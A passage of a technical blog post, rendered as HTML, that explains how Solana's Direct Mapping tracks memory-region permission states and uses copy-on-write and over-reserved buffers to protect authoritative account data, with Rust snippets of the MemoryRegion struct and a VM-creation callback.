<pre><div class="relative my-6 border border-white/10 bg-black/60"><div class="absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase">:: <!-- -->RUST</div><div class="rounded-sm !bg-transparent !m-0" style="color:#ccc;background:#0a0a0a;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;border:1px solid rgba(255, 255, 255, 0.15);box-shadow:0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)"><code class="language-rust" style="white-space:pre;color:#e0e0e0;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">1</span><span class="token token" style="color:#cc99cd">pub</span><span> </span><span class="token token" style="color:#cc99cd">struct</span><span> </span><span class="token token type-definition" style="color:#f8c555">MemoryRegion</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">2</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> host_addr</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Cell</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">,</span><span>     </span><span class="token token" style="color:#999">// start host address</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">3</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> vm_addr</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">,</span><span>             </span><span class="token token" style="color:#999">// start virtual address</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">4</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> vm_addr_end</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">,</span><span>         </span><span class="token token" style="color:#999">// end virtual address</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">5</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> len</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">,</span><span>                 </span><span class="token token" style="color:#999">// Length in bytes</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">6</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> vm_gap_shift</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">,</span><span>         </span><span class="token token" style="color:#999">// Address translation parameters</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">7</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> state</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Cell</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">MemoryState</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#999">// Permission tracking</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">8</span><span></span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">9</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">10</span><span></span><span class="token token" style="color:#cc99cd">pub</span><span> </span><span class="token token" style="color:#cc99cd">enum</span><span> </span><span class="token token type-definition" style="color:#f8c555">MemoryState</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">11</span><span>    </span><span class="token token" style="color:#f8c555">Readable</span><span class="token token" style="color:#ccc">,</span><span>   </span><span class="token token" style="color:#999">// The memory region is readable</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">12</span><span>    </span><span class="token token" style="color:#f8c555">Writable</span><span class="token token" style="color:#ccc">,</span><span>   </span><span class="token token" style="color:#999">// The memory region is writable</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">13</span><span>    </span><span class="token token" style="color:#f8c555">Cow</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span>   </span><span class="token token" style="color:#999">// The memory region is writable but must be copied before writing</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">14</span><span></span><span class="token token" style="color:#ccc">}</span></code></div></div></pre>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Each <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code> now tracks its permission state and enforces access controls on data writes. When a program tries to write to account data, the runtime immediately checks the region&#x27;s state and either allows the write, triggers a copy-on-write operation, or rejects the access entirely.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">The key change is the addition of the <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">state</code> field that replaces the simple <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">is_writable</code> boolean. This allows for more sophisticated permission management, particularly the <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">Cow(u64)</code> state that triggers copy-on-write operations when needed.</p>
<h3 class="text-2xl sm:text-3xl mt-6 mb-2 text-white">Copy-on-Write (CoW) Strategy</h3>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Now let&#x27;s start discussing why an additional copy-on-write state is required.</p>
<h4 class="text-xl sm:text-2xl mt-4 mb-2 text-white">Avoid Authoritative Data Contamination</h4>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Aside from plain read and write authorization, Direct Mapping introduces an even greater problem, the rollback of changes on transaction reverts. But why is this a problem? Aren&#x27;t the <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">AccountSharedDatas</code> in <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">TransactionContext</code> already a cache? This boils down to some details of <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">TransactionContext</code> that we ommitted earlier.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">When <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">TransactionContext</code> and <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">AccountSharedData</code> are first created, <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">AccountSharedData.data</code> actually points to the authoritative account data of the persistent storage (notice <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">AccountSharedData</code> is an <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">Arc::&lt;Vec&lt;u8&gt;&gt;</code>). Upon flushing account changes to <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">AccountSharedData</code> on CPI or instruction boundaries, if the data is modified, <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">Arc::make_mut</code> will be called to create a copy of the data to avoid contamination of the authoritative copy. This is effectively a copy-on-write mechanism to prevent <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">TransactionContext</code> from having to clone all account data. The effectiveness is however limited by the need to serialize data into VMs.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">With Direct Mapping, the serialization is removed, allowing us to fully enjoy the benifits copy-on-write brings, but it is also no longer possible to rely on calling <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">Arc::make_mut</code> on CPI and instruction boundaries to protect the authoritative copy. Instead, the copy-on-write mechanism needs to be inlined into the timely memory access verfications.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">This is where the copy-on-write state comes in handy. By adding a dedicated state, Solana can differentiate between first and latter writes to account data. First writes will see a <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code> of the state <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">CoW</code> and consequently make a copy of the data buffer and update the state. Latter writes will then see a state of <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">Writable</code>, and know that we&#x27;re already operating on a dedicated copy and no longer need to worry about contanimating authoritative data.</p>
<h4 class="text-xl sm:text-2xl mt-4 mb-2 text-white">Buffer Reallocation Management</h4>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Naturally, with the Direct Mapping enabled, we&#x27;d also need to address account data growth possibilities. A naive approach would be to resize the underlying <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">AccountSharedData</code> buffer whenever more space is required. This approach is inefficient, however, since each resize might introduce a realloc of the data buffer, and in turn, require a copy of the data. Frequent copies defeat the entire purpose of the Direct Mapping optimization.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Solana&#x27;s approach is to instead over-reserve the reallocated buffer size. On the first copy of the data (i.e. copy-on-write), the <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">AccountSharedData.data</code> reserves a buffer big enough to accommodate the max account data growth allowed by a transaction. This removes the need to constantly reallocate the buffer.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed"><span class="block my-8"><img class="mx-auto" src="/blog/2025_06_27/copy_on_write.png" alt="Copy on Write"/></span></p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Summarizing the ideas, copy-on-write under Direct Mapping appears as shown in the diagram above, where <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">AccountSharedData</code> may have it&#x27;s <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">data</code> vector clones, and <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code> must have its <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">Host_Addr</code> updated accordingly.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">For reference, the code for writing to virtual memory now looks like this. Where memory access authorization is checked inline, and a callback function is used to update <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code> and <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">AccountSharedData.data</code> for buffers in CoW state.</p>
<pre><div class="relative my-6 border border-white/10 bg-black/60"><div class="absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase">:: <!-- -->RUST</div><div class="rounded-sm !bg-transparent !m-0" style="color:#ccc;background:#0a0a0a;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;border:1px solid rgba(255, 255, 255, 0.15);box-shadow:0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)"><code class="language-rust" style="white-space:pre;color:#e0e0e0;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">1</span><span class="token token" style="color:#cc99cd">pub</span><span> </span><span class="token token" style="color:#cc99cd">fn</span><span> </span><span class="token token function-definition" style="color:#f08d49">create_vm</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;a</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;b</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">...</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">-&gt;</span><span> </span><span class="token token" style="color:#f8c555">Result</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">EbpfVm</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;a</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f8c555">RequisiteVerifier</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f8c555">InvokeContext</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;b</span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f8c555">Box</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#cc99cd">dyn</span><span> </span><span class="token token" style="color:#e2777a">std</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#e2777a">error</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Error</span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">2</span><span>    </span><span class="token token" style="color:#cc99cd">let</span><span> stack_size </span><span class="token token" style="color:#67cdcc">=</span><span> stack</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">len</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">3</span><span>    </span><span class="token token" style="color:#cc99cd">let</span><span> heap_size </span><span class="token token" style="color:#67cdcc">=</span><span> heap</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">len</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">4</span><span>    </span><span class="token token" style="color:#cc99cd">let</span><span> accounts </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#f8c555">Arc</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">clone</span><span class="token token" style="color:#ccc">(</span><span>invoke_context</span><span class="token token" style="color:#ccc">.</span><span>transaction_context</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">accounts</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">5</span><span>    </span><span class="token token" style="color:#cc99cd">let</span><span> memory_mapping </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#f08d49">create_memory_mapping</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">6</span><span>        </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">7</span><span>        regions</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">8</span><span>        </span><span class="token token" style="color:#999">// this is the cow_cb</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">9</span><span>        </span><span class="token token" style="color:#f8c555">Some</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f8c555">Box</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">new</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#cc99cd">move</span><span> </span><span class="token token closure-params closure-punctuation" style="color:#ccc">|</span><span class="token token closure-params">index_in_transaction</span><span class="token token closure-params closure-punctuation" style="color:#ccc">|</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">10</span><span>            </span><span class="token token" style="color:#999">// The two calls below can&#x27;t really fail. If they fail because of a bug,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">11</span><span>            </span><span class="token token" style="color:#999">// whatever is writing will trigger an EbpfError::AccessViolation like</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">12</span><span>            </span><span class="token token" style="color:#999">// if the region was readonly, and the transaction will fail gracefully.</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">13</span><span>            </span><span class="token token" style="color:#cc99cd">let</span><span> </span><span class="token token" style="color:#cc99cd">mut</span><span> account </span><span class="token token" style="color:#67cdcc">=</span><span> accounts
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">14</span><span>                </span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">try_borrow_mut</span><span class="token token" style="color:#ccc">(</span><span>index_in_transaction </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#f8c555">IndexOfAccount</span><span class="token token" style="color:#ccc">)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">15</span><span>                </span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">map_err</span><span class="token token" style="color:#ccc">(</span><span class="token token closure-params closure-punctuation" style="color:#ccc">|</span><span class="token token closure-params">_</span><span class="token token closure-params closure-punctuation" style="color:#ccc">|</span><span> </span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#67cdcc">?</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">16</span>            accounts
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">17</span><span>                </span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">touch</span><span class="token token" style="color:#ccc">(</span><span>index_in_transaction </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#f8c555">IndexOfAccount</span><span class="token token" style="color:#ccc">)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">18</span><span>                </span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">map_err</span><span class="token token" style="color:#ccc">(</span><span class="token token closure-params closure-punctuation" style="color:#ccc">|</span><span class="token token closure-params">_</span><span class="token token closure-params closure-punctuation" style="color:#ccc">|</span><span> </span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#67cdcc">?</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">19</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">20</span><span>            </span><span class="token token" style="color:#cc99cd">if</span><span> account</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">is_shared</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">21</span><span>                </span><span class="token token" style="color:#999">// See BorrowedAccount::make_data_mut() as to why we reserve extra</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">22</span><span>                </span><span class="token token" style="color:#999">// MAX_PERMITTED_DATA_INCREASE bytes here.</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">23</span><span>                account</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">reserve</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f8c555">MAX_PERMITTED_DATA_INCREASE</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">24</span><span>            </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">25</span><span>            </span><span class="token token" style="color:#f8c555">Ok</span><span class="token token" style="color:#ccc">(</span><span>account</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">data_as_mut_slice</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">as_mut_ptr</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">26</span><span>        </span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">27</span><span>    </span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#67cdcc">?</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">28</span><span>    </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">29</span><span></span><span class="token token" style="color:#ccc">)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">30</span>
